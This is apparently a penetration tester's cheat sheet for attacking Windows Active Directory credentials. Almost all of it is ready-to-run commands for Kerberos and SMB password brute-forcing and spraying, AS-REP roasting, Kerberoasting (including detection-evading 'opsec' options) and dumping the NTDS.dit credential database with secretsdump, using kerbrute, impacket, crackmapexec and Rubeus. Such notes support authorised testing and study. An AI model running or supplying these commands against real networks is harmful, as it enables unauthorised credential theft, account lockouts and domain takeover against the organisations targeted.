# Passwords & hashes
## Kerberos
Brute force passwords - WILL LOCKOUT USER:
```bash
kerbrute bruteuser --dc <IP> -d '<DOMAIN>' <PASSLIST> '<USER>'
```

Check a password against users in list:
```bash
kerbrute passwordspray --dc <IP> -d '<DOMAIN>' -v <USERLIST> '<PASS>'
```

AS-REP Roasting:
```bash
impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/' -usersfile <USERLIST>
impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request # PTH
crackmapexec ldap <IP> --kdcHost <IP> -u '<USER>' -p '<PASS>' --asreproast <OUTPUT> # PTH
Rubeus.exe asreproast /nowrap
```

(TGS-REP) Kerberoasting:
```bash
impacket-GetUserSPNs -dc-ip <IP> '<DOMAIN>/' -usersfile <USERLIST>
impacket-GetUserSPNs -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request # PTH
crackmapexec ldap <IP> --kdcHost <IP> -u '<USER>' -p '<PASS>' --kerberoasting <OUTPUT> # PTH
Rubeus.exe kerberoast /nowrap
Rubeus.exe kerberoast /usetgtdeleg /nowrap # tgtdeleg ticket to request service tickets - requests RC4 for AES accounts
Rubeus.exe kerberoast /rc4opsec /nowrap # "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts
```

## SMB
Brute force passwords - WILL LOCKOUT USER:
```bash
crackmapexec smb <IP> -u '<USER>' -p <PASSLIST> # PTH
```

Check password against users in list:
```bash
crackmapexec smb <IP> -u <USERLIST> -p '<PASS>' # PTH
```

Dump NTDS.dit file. (If you've admin rights):
```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<IP>' # PTH
```